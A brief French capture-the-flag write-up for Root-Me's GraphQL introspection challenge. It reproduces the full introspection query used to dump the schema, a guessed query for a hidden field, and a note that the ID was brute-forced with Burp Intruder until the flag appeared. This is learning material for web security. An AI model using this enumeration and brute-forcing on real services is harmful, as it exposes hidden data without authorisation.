Le challenge : https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Introspection

Vu sur https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html

On va injecter ceci 
‘‘‘
{
  "query": "query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n      }\n    }\n  }\n}\n"
}
‘‘‘

ON va voir tout ce qui est possible de faire 

On devine donc qu'on à ça 
‘‘‘
{
  IAmNotHere(very_long_id: n) {
    very_long_id
    very_long_value
  }
}
‘‘‘

On itere avec Burp avec intruder et le payload  N sur number et au 17e on obtient le flag